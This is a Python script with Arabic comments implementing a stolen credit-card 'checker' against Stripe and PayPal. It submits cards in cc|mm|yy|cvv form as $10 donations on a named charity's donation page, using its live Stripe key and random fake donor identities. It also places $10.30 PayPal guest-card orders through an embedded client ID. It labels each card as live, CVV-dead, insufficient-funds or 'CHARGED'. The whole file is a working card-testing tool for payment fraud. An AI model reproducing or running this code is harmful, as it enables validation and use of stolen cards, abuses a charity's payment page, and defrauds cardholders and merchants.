"""
جميع البوابات - Stripe + PayPal
"""

import requests
import re
import random
import uuid
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# STRIPE GATEWAY
# ==========================================

def get_session():
    session = requests.Session()
    session.verify = False
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; M2006C3LG Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
    })
    return session

def get_csrf_token(session):
    try:
        resp = session.get("https://friendsforsight.org/donate-online2", timeout=15)
        csrf_match = re.search(r'"csrf\.token":"([^"]+)"', resp.text)
        if not csrf_match:
            csrf_match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text)
        if csrf_match:
            return csrf_match.group(1)
    except:
        pass
    return None

def check_stripe(card_input):
    """فحص Stripe"""
    parts = card_input.split('|')
    if len(parts) < 4:
        return "INVALID", "صيغة خاطئة", ""

    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2:
        yy = '20' + yy

    try:
        session = get_session()
        csrf_token = get_csrf_token(session)
        if not csrf_token:
            return "ERROR", "فشل CSRF", ""

        token_payload = {
            'guid': uuid.uuid4().hex[:32],
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
            'referrer': 'https://friendsforsight.org',
            'time_on_page': str(random.randint(50000, 90000)),
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'payment_user_agent': 'stripe.js/19f3ad3143',
            'key': 'pk_live_2ZQLH8Ey19wgbFqciAkR2gig'
        }

        stripe_headers = {
            'Accept': 'application/json',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'content-type': 'application/x-www-form-urlencoded',
        }

        token_resp = requests.post('https://api.stripe.com/v1/tokens', data=token_payload, headers=stripe_headers, timeout=15)
        token_json = token_resp.json()

        if 'error' in token_json:
            error_msg = token_json['error'].get('message', '')
            msg_lower = error_msg.lower()

            if 'incorrect_cvc' in msg_lower:
                return "APPROVED", "✅ CCN Live / CVV Dead", ""
            if 'insufficient_funds' in msg_lower:
                return "APPROVED", "✅ رصيد غير كافي", ""
            if 'expired_card' in msg_lower:
                return "DECLINED", "❌ بطاقة منتهية", ""
            if 'card_declined' in msg_lower:
                return "DECLINED", "❌ البطاقة مرفوضة", ""
            return "DECLINED", f"❌ {error_msg}", ""

        token_id = token_json.get('id')
        if not token_id:
            return "ERROR", "لا يوجد Token", ""

        names = ['John', 'James', 'Robert', 'Michael', 'David']
        surnames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones']

        donation_data = {
            'rd_amount': '10',
            'amount': '10',
            'r_frequency': 'm',
            'first_name': random.choice(names),
            'last_name': random.choice(surnames),
            'zip': str(random.randint(10001, 99999)),
            'email': f'john{random.randint(100,999)}@gmail.com',
            'payment_method': 'os_stripe',
            'card_type': 'Visa',
            'campaign_id': '1',
            'task': 'donation.process',
            csrf_token: '1',
            'currency_code': 'USD',
            'stripeToken': token_id
        }

        donate_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'origin': 'https://friendsforsight.org',
            'referer': 'https://friendsforsight.org/donate-online2',
            'content-type': 'application/x-www-form-urlencoded',
        }

        donate_resp = session.post("https://friendsforsight.org/donate-online2", data=donation_data, headers=donate_headers, timeout=20)
        response_text = donate_resp.text
        response_url = donate_resp.url

        reason_match = re.search(r'<div class="controls">\s*(.*?)\s*</div>', response_text, re.DOTALL)
        reason = reason_match.group(1).strip() if reason_match else None

        if 'failure' in response_url.lower():
            if reason:
                if 'security code is incorrect' in reason.lower():
                    return "APPROVED", "✅ CCN Live / CVV Dead", ""
                if 'insufficient' in reason.lower():
                    return "APPROVED", "✅ رصيد غير كافي", ""
            return "DECLINED", f"❌ {reason if reason else 'مرفوضة'}", ""

        if 'thank you for your donation' in response_text.lower():
            return "CHARGED", "🎉 تم الشحن - $10", ""

        return "UNKNOWN", reason if reason else "نتيجة غير معروفة", ""
    
    except Exception as e:
        return "ERROR", f"خطأ: {str(e)}", ""

# ==========================================
# PAYPAL GATEWAY
# ==========================================

CLIENT_ID = 'Abbl3qbVZxe9QoSsjOTNomMJy1WYEt-6m-t-N_duN7xPWKVnQnku51N6wPHnP9E0Nzu5C0qjuBYDXqnz'

def get_card_type(cc):
    if cc.startswith('4'):
        return 'VISA'
    elif cc.startswith(('51', '52', '53', '54', '55')):
        return 'MASTER_CARD'
    elif cc.startswith(('34', '37')):
        return 'AMEX'
    return 'VISA'

def get_paypal_access_token():
    try:
        token_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
        }
        token_data = {'grant_type': 'client_credentials'}
        token_resp = requests.post('https://api.paypal.com/v1/oauth2/token', data=token_data, headers=token_headers, auth=(CLIENT_ID, ''), timeout=15)
        return token_resp.json().get('access_token')
    except:
        return None

def check_paypal(card_input):
    """فحص PayPal"""
    parts = card_input.split('|')
    if len(parts) < 4:
        return "INVALID", "صيغة خاطئة", ""

    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]

    if len(yy) == 2:
        yy = '20' + yy
    if len(mm) == 1:
        mm = '0' + mm

    card_type = get_card_type(cc)

    try:
        access_token = get_paypal_access_token()
        if not access_token:
            return "ERROR", "فشل Access Token", ""

        fn = random.choice(['John', 'James', 'Robert'])
        ln = random.choice(['Smith', 'Johnson', 'Brown'])
        email = f'{fn.lower()}{random.randint(100,999)}@gmail.com'
        zip_code = str(random.randint(10001, 99999))

        order_payload = {
            "intent": "CAPTURE",
            "purchase_units": [{
                "amount": {"value": "10.30", "currency_code": "USD"}
            }],
            "payer": {
                "email_address": email,
                "name": {"name": f"{fn} {ln}"},
                "address": {"postal_code": zip_code, "country_code": "US"}
            }
        }

        api_headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
        }

        order_resp = requests.post('https://api.paypal.com/v2/checkout/orders', json=order_payload, headers=api_headers, timeout=20)
        order_id = order_resp.json().get('id')

        if not order_id:
            return "ERROR", "فشل Order", ""

        graphql_payload = {
            "query": """
                mutation payWithCard(
                    $token: String!
                    $card: CardInput
                    $phoneNumber: String
                    $firstName: String
                    $lastName: String
                    $billingAddress: AddressInput
                    $email: String
                ) {
                    approveGuestPaymentWithCreditCard(
                        token: $token
                        card: $card
                        phoneNumber: $phoneNumber
                        firstName: $firstName
                        lastName: $lastName
                        email: $email
                        billingAddress: $billingAddress
                    ) {
                        cart { cartId }
                    }
                }
            """,
            "variables": {
                "token": order_id,
                "card": {
                    "cardNumber": cc,
                    "type": card_type,
                    "expirationDate": f"{mm}/{yy}",
                    "postalCode": zip_code,
                    "securityCode": cvv
                },
                "phoneNumber": f"+1{random.randint(2000000000, 9999999999)}",
                "firstName": fn,
                "lastName": ln,
                "email": email,
                "billingAddress": {
                    "givenName": fn,
                    "familyName": ln,
                    "line1": f"{random.randint(100,999)} Main St",
                    "city": "New York",
                    "state": "NY",
                    "postalCode": zip_code,
                    "country": "US"
                }
            }
        }

        graphql_headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'paypal-client-context': order_id,
            'authorization': f'Bearer {access_token}',
        }

        graphql_resp = requests.post('https://www.paypal.com/graphql?paywithcard', json=graphql_payload, headers=graphql_headers, timeout=20)
        graphql_json = graphql_resp.json()

        if 'errors' in graphql_json:
            error_msg = graphql_json['errors'][0].get('message', '')
            msg_lower = error_msg.lower()

            if 'invalid_security_code' in msg_lower:
                return "APPROVED", "✅ CCN Live / CVV Dead", ""
            if 'insufficient_funds' in msg_lower:
                return "APPROVED", "✅ رصيد غير كافي", ""
            if 'card_declined' in msg_lower:
                return "DECLINED", "❌ مرفوضة", ""
            return "DECLINED", f"❌ {error_msg}", ""

        data = graphql_json.get('data', {}).get('approveGuestPaymentWithCreditCard', {})
        if data.get('cart', {}).get('cartId'):
            return "CHARGED", "🎉 تم الشحن - $10.30", ""

        return "UNKNOWN", "نتيجة غير معروفة", ""
    
    except Exception as e:
        return "ERROR", f"خطأ: {str(e)}", ""

# ==========================================
# Gateway Manager
# ==========================================

GATEWAYS = {
    'stripe': check_stripe,
    'paypal': check_paypal
}

def check_card(gateway_name, card):
    """فحص بطاقة"""
    if gateway_name in GATEWAYS:
        return GATEWAYS[gateway_name](card)
    return "ERROR", "بوابة غير موجودة", ""

def get_available_gateways():
    """الحصول على البوابات المتاحة"""
    return list(GATEWAYS.keys())
